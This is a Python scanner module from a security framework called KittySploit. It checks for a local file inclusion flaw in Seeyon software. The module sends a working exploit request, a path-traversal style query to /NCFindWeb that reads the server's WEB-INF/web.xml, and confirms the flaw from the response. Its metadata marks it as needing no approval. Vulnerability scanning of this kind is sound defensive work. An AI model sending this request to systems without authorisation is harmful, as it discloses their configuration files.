#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Seeyon WooYun - Local File Inclusion Detection',
        'description': 'Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to the attacker via local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'seeyon', 'wooyun', 'lfi', 'zhiyuan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<servlet-name>NCInvokerServlet</servlet-name>',)
        header_any = ('application/xml',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Seeyon WooYun - Local File Inclusion detected",
                path='/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml',
            )
            return True
        return False

